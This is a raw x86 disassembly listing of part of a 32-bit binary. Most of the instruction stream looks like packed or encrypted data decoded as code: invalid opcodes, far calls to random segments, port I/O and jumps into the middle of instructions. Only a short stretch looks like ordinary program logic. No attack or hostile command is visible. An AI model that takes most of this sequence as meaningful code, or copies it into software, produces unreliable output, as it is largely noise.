  4217fb:	and    ah,BYTE PTR [edx]
  4217fd:	sbb    BYTE PTR [esi-0x22987f71],bh
  421803:	sar    DWORD PTR [ebx-0x3c],0x6b
  421807:	adc    DWORD PTR [ebp-0x74],esp
  42180a:	mov    eax,0x16f5ed86
  42180f:	out    dx,eax
  421810:	ret    0xbb35
  421813:	jle    0x4217cf
  421815:	pusha  
  421816:	add    eax,0xa592c550
  42181b:	loop   0x42184a
  42181d:	clc    
  42181e:	adc    eax,esi
  421820:	ins    DWORD PTR es:[edi],dx
  421821:	ins    DWORD PTR es:[edi],dx
  421822:	aas    
  421823:	into   
  421824:	sub    esi,DWORD PTR [edx+0x4f]
  421827:	xchg   ecx,eax
  421828:	in     al,dx
  421829:	sbb    eax,esp
  42182b:	sub    eax,0x83aebd85
  421830:	add    bl,BYTE PTR [ebp-0x6f]
  421833:	les    edi,FWORD PTR [ebx+eiz*2+0x26863c48]
  42183a:	sub    eax,DWORD PTR [edi]
  42183c:	stos   BYTE PTR es:[edi],al
  42183d:	push   edx
  42183e:	fsub   st,st(2)
  421840:	out    dx,al
  421841:	data16 add al,0x94
  421844:	or     eax,DWORD PTR [eax]
  421846:	bound  edi,QWORD PTR [edi-0x3f]
  421849:	je     0x421860
  42184b:	jp     0x421844
  42184d:	lods   al,BYTE PTR ds:[esi]
  42184e:	lahf   
  42184f:	loope  0x4217d8
  421851:	cli    
  421852:	dec    ebx
  421853:	jecxz  0x421853
  421855:	jmpw   0xfec0
  421859:	sub    bl,dl
  42185b:	xchg   BYTE PTR [ebx+0x77],dh
  42185e:	data16 sbb al,0xe7
  421861:	push   edi
  421862:	jae    0x421832
  421864:	add    bl,BYTE PTR [edx]
  421866:	jmp    0x4218d4
  421868:	jbe    0x4218b6
  42186a:	pop    edi
  42186b:	push   edi
  42186c:	pop    ss
  42186d:	xchg   edx,eax
  42186e:	dec    ecx
  42186f:	jmp    0x4218da
  421871:	push   0xffffffb3
  421873:	shr    ebp,0x52
  421876:	and    eax,0xec860118
  42187b:	(bad)  
  42187c:	mov    ds:0x95a70816,eax
  421881:	push   ecx
  421882:	ret    
  421883:	arpl   WORD PTR [ebx+0x7e],bx
  421886:	aad    0xdc
  421888:	and    esp,DWORD PTR [edi-0x64]
  42188b:	rcl    DWORD PTR [ecx-0x8],0x17
  42188f:	mov    bl,0x49
  421891:	aad    0x39
  421893:	or     BYTE PTR [esi-0x14],dh
  421896:	inc    ebp
  421897:	dec    esp
  421898:	or     al,ah
  42189a:	or     BYTE PTR [esp+eiz*8+0x61],0xc7
  42189f:	mov    dh,0x3c
  4218a1:	ss jne 0x42190a
  4218a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218a5:	std    
  4218a6:	loop   0x42183e
  4218a8:	retf   
  4218a9:	retf   0xb279
  4218ac:	sub    al,BYTE PTR [ebx]
  4218ae:	xor    ebp,eax
  4218b0:	adc    dl,BYTE PTR [esi-0xc2afa39]
  4218b6:	sbb    BYTE PTR [edi],bl
  4218b8:	imul   ebx
  4218ba:	icebp  
  4218bb:	xlat   BYTE PTR ds:[ebx]
  4218bc:	xor    DWORD PTR [edx+0x3dddc8c6],0x1aadf827
  4218c6:	mov    cl,0xd5
  4218c8:	inc    edx
  4218c9:	or     cl,cl
  4218cb:	mov    BYTE PTR [edi+0x4863d03c],bl
  4218d1:	dec    ebx
  4218d2:	push   ss
  4218d3:	pop    edx
  4218d4:	dec    esi
  4218d5:	rcr    DWORD PTR [ebp+0x456c55a],0xb3
  4218dc:	inc    esp
  4218dd:	pop    es
  4218de:	ja     0x421951
  4218e0:	mov    WORD PTR [ebx-0x2b],gs
  4218e3:	cmp    ecx,DWORD PTR [ebp-0x4e1029a]
  4218e9:	add    eax,0x32f3825c
  4218ee:	test   BYTE PTR [ebx+0x54afa76b],dl
  4218f4:	(bad)  
  4218f5:	clc    
  4218f6:	pop    es
  4218f7:	clc    
  4218f8:	rol    ebx,cl
  4218fa:	xchg   ecx,eax
  4218fb:	adc    DWORD PTR [edi+0xa],esp
  4218fe:	fmul   DWORD PTR [eax-0x32]
  421901:	mov    bl,0x8
  421903:	loop   0x4218a7
  421905:	sub    eax,0x78680f3a
  42190a:	std    
  42190b:	mov    cl,0xae
  42190d:	jmp    0x42197c
  42190f:	aam    0x52
  421911:	scas   eax,DWORD PTR es:[edi]
  421912:	scas   al,BYTE PTR es:[edi]
  421913:	stc    
  421914:	dec    esi
  421915:	in     eax,0xfc
  421917:	leave  
  421918:	daa    
  421919:	sub    BYTE PTR [ecx-0x386d46df],ch
  42191f:	cmp    DWORD PTR [eax],esp
  421921:	shr    DWORD PTR [ecx-0x53],0x2c
  421925:	sbb    BYTE PTR [ebx+0x4cad110b],dl
  42192b:	test   al,0xc1
  42192d:	xchg   ebx,eax
  42192e:	sar    DWORD PTR [ecx-0x3b75dc21],1
  421934:	loope  0x4218de
  421936:	xchg   edx,eax
  421937:	dec    eax
  421938:	cmp    al,0xca
  42193a:	leave  
  42193b:	call   0xeefa:0xb43f6d11
  421942:	call   0x4e5cbc61
  421947:	mov    esi,0x9463e11e
  42194c:	push   0x800c2b6d
  421951:	pop    edx
  421952:	mov    edi,0xdc3a51c5
  421957:	inc    esi
  421958:	xlat   BYTE PTR ds:[ebx]
  421959:	rol    BYTE PTR [ebx],0x11
  42195c:	mov    edi,0x3b56520
  421961:	adc    al,0xa1
  421963:	retf   0x8b81
  421966:	js     0x421926
  421968:	and    al,0x22
  42196a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42196b:	(bad)  
  42196c:	push   edx
  42196d:	push   ds
  42196e:	add    eax,0x50692c07
  421973:	test   eax,0xce1e53b2
  421978:	jecxz  0x42197b
  42197a:	mov    ebx,0xffcb003f
  42197f:	sbb    BYTE PTR [esi-0x61],0x9d
  421983:	lea    ebx,ds:0xc558b3d
  421989:	mov    edi,DWORD PTR ds:0x426448
  42198f:	sbb    edx,DWORD PTR ds:0x426840
  421995:	mov    edi,DWORD PTR [edi+0x198]
  42199b:	sub    DWORD PTR ds:0x426804,edx
  4219a1:	mov    edx,0x6729a14b
  4219a6:	xor    eax,edx
  4219a8:	add    eax,esi
  4219aa:	mov    DWORD PTR ds:0x426858,0x2382
  4219b4:	cmp    DWORD PTR [edi],eax
  4219b6:	mov    DWORD PTR ds:0x4267c8,0x1857
  4219c0:	jne    0x42350b
  4219c6:	mov    DWORD PTR ds:0x426810,0x4955
  4219d0:	jmp    0x423283
  4219d5:	dec    ebp
  4219d6:	cmc    
  4219d7:	pushf  
  4219d8:	adc    DWORD PTR [eax+edx*2],esp
  4219db:	je     0x4219d2
  4219dd:	mov    BYTE PTR [edi],al
  4219df:	popf   
  4219e0:	push   ebp
  4219e1:	xchg   BYTE PTR [edi-0x1e],ch
  4219e4:	sbb    BYTE PTR [edx+0xd7b7a64],dl
  4219ea:	xchg   ebx,eax
  4219eb:	jnp    0x421a68
  4219ed:	dec    esp
  4219ef:	or     edi,DWORD PTR [ecx]
  4219f1:	cmp    BYTE PTR [esp+ebp*1-0x6],bh
  4219f5:	sbb    esp,DWORD PTR [esi-0x76]
  4219f8:	test   al,0xb4
  4219fa:	frstor [ecx+0x44c6cbde]
  421a00:	or     DWORD PTR [ecx-0x7a],ebx
  421a03:	xor    esp,DWORD PTR [esi]
  421a05:	das    
  421a06:	add    al,0x58
  421a08:	dec    esp
  421a09:	mov    ebx,ecx
  421a0b:	loopne 0x4219ff
  421a0d:	add    DWORD PTR [ebx],0xb22c985a
  421a13:	jge    0x421a75
  421a15:	pop    ecx
  421a16:	idiv   BYTE PTR [ebx+edi*1+0x3f0dbcd7]
  421a1d:	in     al,0x7e
  421a1f:	fnsave [edx]
  421a21:	push   0xffffffa0
  421a23:	xchg   DWORD PTR [ecx-0x19],esi
  421a26:	cld    
  421a27:	ds inc edx
  421a29:	ins    BYTE PTR es:[edi],dx
  421a2a:	xor    DWORD PTR [edi+eax*2-0x13],eax
  421a2e:	xchg   BYTE PTR [edx],cl
  421a30:	aad    0x8c
  421a32:	dec    edi
  421a33:	cmp    al,0x40
  421a35:	into   
  421a36:	test   DWORD PTR [edi+0x2b42929f],edi
  421a3c:	shl    DWORD PTR [edi],cl
  421a3e:	int3   
  421a3f:	lahf   
  421a40:	mov    edi,0x573107
  421a45:	cdq    
  421a46:	stos   BYTE PTR es:[edi],al
  421a47:	cmc    
  421a48:	mov    cs,WORD PTR [ecx-0x9]
  421a4b:	in     eax,0x5d
  421a4d:	bound  esp,QWORD PTR [ebx-0x143d029b]
  421a53:	inc    edx
  421a54:	addr16 xchg edi,eax
  421a56:	sub    DWORD PTR [esi-0x6e],edx
  421a59:	enter  0x8199,0xec
  421a5d:	push   edi
  421a5e:	outs   dx,BYTE PTR ds:[esi]
  421a5f:	std    
  421a60:	mov    ebp,DWORD PTR [ebp+ebx*1-0x69be9704]
  421a67:	lods   al,BYTE PTR ds:[esi]
  421a68:	mov    al,0x45
  421a6a:	call   0x34db815c
  421a6f:	inc    ebx
  421a70:	mov    bh,0x6b
  421a72:	test   eax,0xe562f586
  421a77:	cmp    al,0xa8
  421a79:	mov    ebp,0xf5ecd05
  421a7e:	cwde   
  421a7f:	mov    ds:0x815545e0,al
  421a84:	outs   dx,BYTE PTR ds:[esi]
  421a85:	aam    0xab
  421a87:	xlat   BYTE PTR ds:[ebx]
  421a88:	(bad)  
  421a89:	dec    esi
  421a8a:	loop   0x421a77
  421a8c:	div    BYTE PTR [esi]
  421a8e:	jle    0x421aa8
  421a90:	sbb    eax,0x37eb77b
  421a95:	cli    
  421a96:	cdq    
  421a97:	adc    BYTE PTR [ecx+0x22c8e905],bh
  421a9d:	mov    al,0x6c
  421a9f:	xor    BYTE PTR [esi+0x2d],ch
  421aa2:	icebp  
  421aa3:	or     ch,bl
  421aa5:	enter  0x4ed3,0x1f
  421aa9:	mov    BYTE PTR [ecx-0x41feae30],cl
  421aaf:	(bad)  
  421ab0:	mov    esi,0x743b9f30
  421ab5:	push   cs
  421ab6:	cdq    
  421ab7:	jne    0x421ae9
  421ab9:	fimul  WORD PTR [edx-0x40cfc308]
  421abf:	adc    eax,0xd5f2151d
  421ac4:	adc    eax,0xd51c9536
  421ac9:	dec    edx
  421aca:	adc    eax,0xefc1702e
  421acf:	mov    bh,0x77
  421ad1:	or     al,0xfd
  421ad3:	jg     0x421a6e
  421ad5:	inc    ecx
  421ad6:	in     eax,dx
  421ad7:	mov    edi,edi
  421ad9:	adc    DWORD PTR [eax+ecx*8+0x73],0x7411d553
  421ae1:	(bad)  
  421ae2:	out    0x33,al
  421ae4:	jae    0x421b0e
  421ae6:	push   esi
  421ae7:	mov    cl,0xbb
  421ae9:	jb     0x421ad0
  421aeb:	xor    DWORD PTR [ebx+0xb],esi
  421aee:	sub    BYTE PTR ds:0x9fe8c446,bl
  421af4:	mov    esi,0xdce7e2c3
  421af9:	cmp    eax,ebx
  421afb:	push   eax
  421afc:	or     eax,0xdc375c36
  421b01:	fisubr WORD PTR [esi-0x6cadab9]
  421b07:	lds    ebp,FWORD PTR [esp+edi*8-0x11d896bd]
  421b0e:	adc    al,0xb1
  421b10:	dec    ebp
  421b11:	or     eax,0x4e531bcc
  421b16:	repz out dx,eax
  421b18:	push   eax
  421b19:	fdiv   DWORD PTR [eax]
  421b1b:	mov    al,0xaf
  421b1d:	sub    al,BYTE PTR [edx+ebx*1]
  421b20:	mov    ecx,0x3cc8d4b4
  421b25:	mov    ch,0xcc
  421b27:	bound  edi,QWORD PTR [eax-0x4a]
  421b2a:	out    0xab,al
  421b2c:	shl    BYTE PTR [esi-0x3e3f13a],1
  421b32:	aaa    
  421b33:	test   al,0xbb
  421b35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b36:	aam    0xe9
  421b38:	push   cs
  421b39:	lds    edx,FWORD PTR [ebx-0x43b42247]
  421b3f:	add    DWORD PTR [edx],eax
  421b41:	or     al,0x75
  421b43:	pop    ecx
  421b44:	xor    DWORD PTR [ebx+eax*8],edx
  421b47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b48:	mov    dl,dl
  421b4a:	mov    esp,0xf2c4cd06
  421b4f:	push   edx
  421b50:	or     DWORD PTR [edx],ebp
  421b52:	outs   dx,DWORD PTR ds:[esi]
  421b53:	test   al,0x6a
  421b55:	jmp    0xd323:0x43e667c2
  421b5c:	jnp    0x421bb1
  421b5e:	pop    esp
  421b5f:	lods   al,BYTE PTR ds:[esi]
  421b60:	add    DWORD PTR [ebx],edx
  421b62:	shl    ebp,0x8f
  421b65:	jbe    0x421b63
  421b67:	cld    
  421b68:	repz push ecx
  421b6a:	and    al,0x92
  421b6c:	add    dh,al
  421b6e:	int3   
  421b6f:	jne    0x421b5f
  421b71:	mov    eax,0x1c778c67
  421b76:	xor    eax,0xb8948a62
  421b7b:	stc    
  421b7c:	adc    eax,0x7ce3b713
  421b81:	xchg   BYTE PTR [esp+eiz*8+0x3d9fa886],dl
  421b88:	push   ecx
  421b89:	and    BYTE PTR [eax+0x40811298],cl
  421b8f:	(bad)  
  421b90:	outs   dx,DWORD PTR ds:[esi]
  421b91:	test   DWORD PTR [ecx+edx*1],ebp
  421b94:	nop
  421b95:	add    DWORD PTR [ebx+eiz*4],edi
  421b98:	push   ds
  421b99:	jbe    0x421c10
  421b9b:	pop    edx
  421b9c:	pop    eax
  421b9d:	pop    edi
  421b9e:	mov    ah,0x14
  421ba0:	leave  
  421ba1:	cli    
  421ba2:	ret    0x679e
  421ba5:	jecxz  0x421b85
  421ba7:	push   edx
  421ba8:	shl    DWORD PTR [esi],cl
  421baa:	jns    0x421bf4
  421bac:	pop    ecx
  421bad:	pop    ss
  421bae:	and    eax,0xf387ef07
  421bb3:	sar    BYTE PTR [esi+0x31],cl
  421bb6:	icebp  
  421bb7:	enter  0xf829,0xbf
  421bbb:	in     al,0x1e
  421bbd:	das    
  421bbe:	mov    cl,0x3c
  421bc0:	add    al,0xe0
  421bc2:	outs   dx,DWORD PTR ds:[esi]
  421bc3:	sbb    al,0xb1
  421bc5:	ins    BYTE PTR es:[edi],dx
  421bc6:	or     ecx,edx
  421bc8:	jb     0x421bd5
  421bca:	aad    0x31
  421bcc:	repnz inc ecx
  421bce:	loope  0x421c35
  421bd0:	mov    ebx,0x3dbcf0fd
  421bd5:	test   al,ch
  421bd7:	loopne 0x421c2e
  421bd9:	aaa    
  421bda:	jecxz  0x421bde
  421bdc:	std    
  421bdd:	(bad)  
  421bde:	int3   
  421bdf:	inc    ebx
  421be0:	inc    esp
  421be1:	popa   
  421be2:	dec    DWORD PTR [edx]
  421be4:	jecxz  0x421c53
  421be6:	dec    edx
  421be7:	xchg   ecx,eax
  421be8:	and    edx,eax
  421bea:	lahf   
  421beb:	stc    
  421bec:	sub    dl,dh
  421bee:	pop    edi
  421bef:	repz les edx,FWORD PTR [edi-0x5f]
  421bf3:	scas   al,BYTE PTR es:[edi]
  421bf4:	and    DWORD PTR [ecx-0x18c475cd],ebx
  421bfa:	and    ebx,DWORD PTR [ebx-0x30]
  421bfd:	xor    BYTE PTR [ebx-0xdf26f15],bh
  421c03:	jnp    0x421ba7
  421c05:	mov    esi,0xf454d944
  421c0a:	stc    
  421c0b:	aas    
  421c0c:	xor    esi,edx
  421c0e:	fwait
  421c0f:	enter  0xfc21,0xd9
  421c13:	xchg   edx,eax
  421c14:	pop    eax
  421c15:	and    eax,0x2bc8605f
  421c1a:	sub    eax,0x1870423
  421c1f:	jg     0x421c83
  421c21:	and    BYTE PTR [eax-0xc],ah
  421c24:	cmc    
  421c25:	jno    0x421c32
  421c27:	loope  0x421bed
  421c29:	add    BYTE PTR [ecx],dh
  421c2b:	and    cl,BYTE PTR [ebp-0xd49beb5]
  421c31:	or     esi,DWORD PTR [ebp-0x15]
  421c34:	inc    ebx
  421c35:	jns    0x421c0c
  421c37:	xchg   DWORD PTR [esi-0x74],esp
  421c3a:	ror    ch,1
  421c3c:	sti    
  421c3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c3e:	mov    bh,0xd2
  421c40:	add    BYTE PTR [eax],0x26
  421c43:	retf   
  421c44:	inc    BYTE PTR [ecx-0x14]
  421c47:	outs   dx,DWORD PTR fs:[esi]
  421c49:	cmc    
  421c4a:	bound  edx,QWORD PTR ds:0x22958014
  421c50:	jl     0x421c31
  421c52:	mov    BYTE PTR [esi],bh
  421c54:	adc    DWORD PTR [edi-0x33c8f862],edi
  421c5a:	pop    esi
  421c5b:	aad    0x88
  421c5d:	pop    esp
  421c5e:	push   ebp
  421c5f:	cli    
  421c60:	sub    edi,ecx
  421c62:	sbb    dl,BYTE PTR ds:0x7ca9a023
  421c68:	lods   eax,DWORD PTR ds:[esi]
  421c69:	rol    DWORD PTR [edx+0xb],cl
  421c6c:	push   esi
  421c6d:	retf   0xff0a
  421c70:	loope  0x421cb4
  421c72:	sbb    al,0xb3
  421c74:	jmp    0x421cab
  421c76:	cmp    ecx,DWORD PTR [esi-0x4f]
  421c79:	retf   
  421c7a:	pop    ds
  421c7b:	loop   0x421c1f
  421c7d:	nop
  421c7e:	adc    BYTE PTR [esi],0x95
  421c81:	xchg   DWORD PTR [ecx-0x11],esp
  421c84:	call   0xd3bb85a0
  421c89:	xor    BYTE PTR [ebp+0x4],0x13
  421c8d:	jae    0x421cc9
  421c8f:	jae    0x421cae
  421c91:	mov    edx,0x91dff2f0
  421c96:	sub    DWORD PTR ds:0xf1a89a26,ebx
  421c9c:	(bad)  
  421c9d:	scas   eax,DWORD PTR es:[edi]
  421c9e:	pop    ds
  421c9f:	pop    ss
  421ca0:	xchg   esi,eax
  421ca1:	call   0x9320:0xef1670ca
  421ca8:	sub    al,0xd0
  421caa:	pusha  
  421cab:	cld    
  421cac:	loope  0x421c81
  421cae:	adc    al,0x1f
  421cb0:	inc    edx
  421cb1:	cmp    eax,esp
  421cb3:	ss mov dh,0x61
  421cb6:	adc    ebx,ebp
  421cb8:	adc    al,0xfc
  421cba:	dec    edx
  421cbb:	mov    bh,0xd0
  421cbd:	push   ecx
  421cbe:	inc    ebp
  421cbf:	push   eax
  421cc0:	cmp    BYTE PTR [edx+esi*2-0x21b07bb5],dl
  421cc7:	pop    esp
  421cc8:	fild   WORD PTR [ebx+eiz*1-0x20]
  421ccc:	or     ebx,ecx
  421cce:	ins    DWORD PTR es:[edi],dx
  421ccf:	stos   BYTE PTR es:[edi],al
  421cd0:	lahf   
  421cd1:	neg    BYTE PTR [ebp-0x15]
  421cd4:	push   esi
  421cd5:	int3   
  421cd6:	xor    al,0x65
  421cd8:	ret    
  421cd9:	jl     0x421ce8
  421cdb:	sub    edi,DWORD PTR [ebx-0x53fce93]
  421ce1:	push   es
  421ce2:	imul   eax,ecx,0x46
  421ce5:	dec    edi
  421ce6:	jl     0x421c9f
  421ce8:	aas    
  421ce9:	inc    ebx
  421cea:	ins    BYTE PTR es:[edi],dx
  421ceb:	call   0xacfd:0xd2a29070
  421cf2:	sbb    DWORD PTR [ebp-0x61],ebx
  421cf5:	in     al,dx
  421cf6:	pop    ebx
  421cf7:	lods   al,BYTE PTR ds:[esi]
  421cf8:	or     al,0x85
  421cfa:	sbb    al,0xf5
  421cfc:	cmc    
  421cfd:	lods   al,BYTE PTR ds:[esi]
  421cfe:	or     eax,0x5a1e10a0
  421d03:	call   0xcfe0:0x1d167e07
  421d0a:	fsub   DWORD PTR [esi-0x4f]
  421d0d:	(bad)  
  421d0f:	xor    DWORD PTR [ebp-0x4aee1d4b],esi
  421d15:	imul   edx,DWORD PTR ss:[edi-0x17e8a8b2],0xe0ab1c42
  421d20:	test   DWORD PTR [ecx+0x6f],ecx
  421d23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d24:	rcl    edx,0xd6
  421d27:	inc    ecx
  421d28:	dec    eax
  421d29:	pop    eax
  421d2a:	inc    BYTE PTR ds:[esi]
  421d2d:	retf   
  421d2e:	inc    esp
  421d2f:	pop    es
  421d30:	xor    ebx,ebx
  421d32:	cld    
  421d33:	mov    edx,0xd7e9a2de
  421d38:	(bad)  
  421d39:	dec    ebx
  421d3a:	aaa    
  421d3b:	push   ebx
  421d3c:	sbb    ecx,edx
  421d3e:	sti    
  421d3f:	xchg   DWORD PTR [ebp-0x78f9be37],esi
  421d45:	outs   dx,BYTE PTR ds:[esi]
  421d46:	cld    
  421d47:	xor    eax,0xbe5e3da1
  421d4c:	pop    ss
  421d4d:	mov    esi,0xf7bbe173
  421d52:	sub    eax,0x6cd18b6c
  421d57:	clc    
  421d58:	dec    ebx
  421d59:	imul   ecx,ebx,0xed44d8fc
  421d5f:	cmp    esi,ecx
  421d61:	jo     0x421d77
  421d63:	mov    eax,ds:0x6cbb6fb0
  421d68:	jg     0x421d94
  421d6a:	jecxz  0x421d84
  421d6c:	push   ecx
  421d6d:	lds    ebx,FWORD PTR [edx]
  421d6f:	cmp    BYTE PTR [edi-0x4e],0x22
  421d73:	or     BYTE PTR [esi+ebx*4+0x4],ch
  421d77:	xor    eax,0x8a65f301
  421d7c:	adc    eax,0xe001d44a
  421d81:	pushf  
  421d82:	sub    DWORD PTR [edx-0x57f8dcc7],edx
  421d88:	jmp    0x421dd5
  421d8a:	ds repnz xor ebp,ebx
  421d8e:	cmp    BYTE PTR [ebx],al
  421d90:	pusha  
  421d91:	addr16 dec esi
  421d93:	dec    ebx
  421d94:	pop    ebx
  421d95:	ror    al,0xfb
  421d98:	and    BYTE PTR [ecx+0x627f7e93],ah
  421d9e:	xor    eax,0x3218332c
  421da3:	test   al,0x1e
  421da5:	adc    BYTE PTR [ecx-0x3bea5702],dl
  421dab:	sar    esp,0xd5
  421dae:	xchg   esp,eax
  421daf:	lock cld 
  421db1:	pusha  
  421db2:	imul   esi,DWORD PTR [eax],0x4ad64258
  421db8:	or     al,0x8d
  421dba:	jae    0x421dd8
  421dbc:	jmp    0x9db2:0x706dd6ee
  421dc3:	add    BYTE PTR [ebx+0x417b5cb1],ch
  421dc9:	pop    ss
  421dca:	sti    
  421dcb:	rcr    ah,0xf7
  421dce:	mov    edx,0x6a510083
  421dd3:	mov    ch,0x76
  421dd5:	sub    eax,0xe0554394
  421dda:	cmp    cl,BYTE PTR [eax+0x57]
  421ddd:	add    ah,BYTE PTR [edi]
  421ddf:	out    dx,al
  421de0:	mov    eax,0x1d44ab73
  421de5:	inc    esi
  421de6:	in     eax,0x20
  421de8:	mov    BYTE PTR ds:0x4fc3639f,dh
  421dee:	aaa    
  421def:	mov    WORD PTR [edx],ds
  421df1:	sbb    eax,0x706908cd
  421df6:	sahf   
  421df7:	(bad)  
  421df8:	cmc    
  421df9:	lods   al,BYTE PTR ds:[esi]
  421dfa:	in     al,dx
  421dfb:	mov    eax,0x19d8bb9c
  421e00:	add    BYTE PTR [eax],bl
  421e02:	xor    bh,BYTE PTR [edi+0x6b000e23]
  421e08:	push   ss
  421e09:	mov    cl,0x3d
  421e0b:	(bad)  [eax-0x3ba96021]
  421e11:	scas   eax,DWORD PTR es:[edi]
  421e12:	xor    al,0xb5
  421e14:	aas    
  421e15:	daa    
  421e16:	scas   eax,DWORD PTR es:[edi]
  421e17:	shl    DWORD PTR [edi],cl
  421e19:	icebp  
  421e1a:	mov    edi,0xb01e8928
  421e1f:	mov    eax,0x70488056
  421e24:	fcom   QWORD PTR [edx+ebx*8+0x154fdbed]
  421e2b:	sbb    DWORD PTR [ecx],esi
  421e2d:	fsub   QWORD PTR [ecx-0x48e6af73]
  421e33:	std    
  421e34:	cmp    BYTE PTR [ebx-0x1246c138],bl
  421e3a:	jmp    0xb0fc:0x4010a299
  421e41:	dec    esp
  421e42:	jmp    0x421e47
  421e44:	hlt    
  421e45:	mov    ecx,0x6d9dffb8
  421e4a:	mov    cl,0x97
  421e4c:	inc    ecx
  421e4d:	inc    ebx
  421e4e:	adc    esp,DWORD PTR [edi-0x512c4f14]
  421e54:	out    0x3e,al
  421e56:	xor    DWORD PTR [ebx+0x2b],esp
  421e59:	ror    BYTE PTR [edi],0x95
  421e5c:	xchg   ecx,eax
  421e5d:	cmp    dh,BYTE PTR [ebp+ebp*4+0x2d]
  421e61:	mov    cl,dl
  421e63:	ret    0x3b52
  421e66:	mov    ch,0x40
  421e68:	call   0xfe8c:0x6116b33c
  421e6f:	mov    ?,WORD PTR [esi-0x25]
  421e72:	and    dl,BYTE PTR [esi-0x72]
  421e75:	je     0x421e17
  421e77:	ins    BYTE PTR es:[edi],dx
  421e78:	ss jmp 0x421ea8
  421e7b:	rcr    BYTE PTR [ebx],cl
  421e7d:	je     0x421e94
  421e7f:	out    0x2c,al
  421e81:	mov    ebx,0x30f92f3a
  421e86:	repz xor BYTE PTR [eax],bl
  421e89:	ss scas al,BYTE PTR es:[edi]
  421e8b:	jmp    eax
  421e8d:	xlat   BYTE PTR ds:[ebx]
  421e8e:	mov    ecx,0x27066089
  421e93:	xchg   edi,eax
  421e94:	neg    DWORD PTR [edi-0x6d6afc76]
  421e9a:	dec    esi
  421e9b:	fnsave [edi]
  421e9d:	daa    
  421e9e:	sbb    DWORD PTR ds:0xc0769dc4,edi
  421ea4:	cmp    BYTE PTR [ebx+0x4abdad7a],dh
  421eaa:	xor    ch,BYTE PTR [ebx-0x7b]
  421ead:	dec    ecx
  421eae:	xor    BYTE PTR [edi+0x78],dh
  421eb1:	das    
  421eb2:	pop    edi
  421eb3:	and    esp,DWORD PTR [edx]
  421eb5:	sub    eax,0x90d3069
  421eba:	xor    edi,0x46
  421ebd:	jge    0x421ebe
  421ebf:	push   ss
  421ec0:	adc    DWORD PTR [ebx+0x46],eax
  421ec3:	stos   BYTE PTR es:[edi],al
  421ec4:	out    0x8,al
  421ec6:	xchg   edi,eax
  421ec7:	xchg   BYTE PTR [ebp-0x60],bh
  421eca:	dec    esp
  421ecb:	aaa    
  421ecc:	jmp    0x421f28
  421ece:	sub    dh,BYTE PTR [edi]
  421ed0:	mov    bh,0x85
  421ed2:	pop    esi
  421ed3:	add    BYTE PTR [edi-0x31],bl
  421ed6:	aam    0xe7
  421ed8:	pop    edi
  421ed9:	test   DWORD PTR [ebx],edi
  421edb:	ret    
  421edc:	aaa    
  421edd:	push   ebp
  421ede:	enter  0xc580,0xa0
  421ee2:	jne    0x421ee5
  421ee4:	push   ebp
  421ee5:	aad    0x57
  421ee7:	cmp    dh,cl
  421ee9:	jmp    0x421e7c
  421eeb:	aad    0x89
  421eed:	hlt    
  421eee:	pop    es
  421eef:	fs ss jmp 0x421f58
  421ef3:	mov    al,0xd1
  421ef5:	push   es
  421ef6:	stos   DWORD PTR es:[edi],eax
  421ef7:	xchg   ebp,eax
  421ef8:	imul   DWORD PTR [ebp+0x79]
  421efb:	sbb    al,0x8f
  421efd:	ficomp DWORD PTR [ebp+0x69]
  421f00:	xchg   dl,al
  421f02:	dec    edx
  421f03:	loopne 0x421f13
  421f05:	jg     0x421f3a
  421f07:	repz rol DWORD PTR [ebx+edx*4],0x9f
  421f0c:	aaa    
  421f0d:	push   edi
  421f0e:	jge    0x421f1a
  421f10:	mov    dh,BYTE PTR ds:0x3d48d8ac
  421f16:	imul   edx,ebp,0xf840e88
  421f1c:	mov    bh,0x48
  421f1e:	retf   
  421f1f:	xor    bh,BYTE PTR [edi]
  421f21:	clc    
  421f22:	pop    ss
  421f23:	push   0xffffffde
  421f25:	lock fild WORD PTR [esi-0x385727f2]
  421f2c:	js     0x421ec6
  421f2e:	mov    DWORD PTR [ecx],eax
  421f30:	(bad)  
  421f31:	clc    
  421f32:	push   ebx
  421f33:	sbb    eax,0x83f1d11f
  421f38:	daa    
  421f39:	pop    ds
  421f3a:	call   0xa0743b74
  421f3f:	fisttp QWORD PTR [esi+0x3b0fd609]
  421f45:	loopne 0x421f76
  421f47:	cdq    
  421f48:	and    ebx,DWORD PTR [eax+0x216ff0e3]
  421f4e:	jo     0x421f4f
  421f50:	in     al,dx
  421f51:	sbb    esi,esi
  421f53:	jp     0x421f91
  421f55:	mov    eax,ds:0x99032430
  421f5a:	and    eax,edi
  421f5c:	xchg   BYTE PTR [eax-0x6f],bl
  421f5f:	sub    BYTE PTR [esi],cl
  421f61:	adc    ecx,DWORD PTR [ebx-0x79f9fa]
  421f67:	shl    DWORD PTR [edi],cl
  421f69:	ins    BYTE PTR es:[edi],dx
  421f6a:	arpl   WORD PTR cs:[edi+edi*1],cx
  421f6e:	js     0x421fb2
  421f70:	(bad)  
  421f71:	ficom  WORD PTR [esi]
  421f73:	mov    eax,DWORD PTR [esi-0x53]
  421f76:	dec    edi
  421f77:	add    al,0x9b
  421f79:	xchg   ebp,eax
  421f7a:	fiadd  WORD PTR [ecx-0x5b]
  421f7d:	retf   0x87bd
  421f80:	xchg   ebp,eax
  421f81:	cmp    BYTE PTR [eax-0x6b],bl
  421f84:	neg    BYTE PTR [eax+0x4412c4f8]
  421f8a:	retf   0x14ee
  421f8d:	out    0x9,eax
  421f8f:	loopne 0x421fd2
  421f91:	daa    
  421f92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f93:	(bad)  
  421f94:	xchg   esi,eax
  421f95:	add    DWORD PTR [edx-0x71497fa8],0xffffffb1
  421f9c:	mov    ah,0xe0
  421f9e:	mov    DWORD PTR [ebx+0x46e8ff86],eax
  421fa4:	jo     0x421fc7
  421fa6:	sub    BYTE PTR [ebx],dh
  421fa8:	jb     0x421fed
  421faa:	lea    edx,[esi]
  421fac:	xor    BYTE PTR [ebx+eiz*1-0x43],bh
  421fb0:	leave  
  421fb1:	pop    ebx
  421fb2:	into   
  421fb3:	sti    
  421fb4:	data16 or al,0xec
  421fb7:	adc    DWORD PTR [edi+0x3e],ecx
  421fba:	cmp    eax,ebx
  421fbc:	scas   al,BYTE PTR es:[edi]
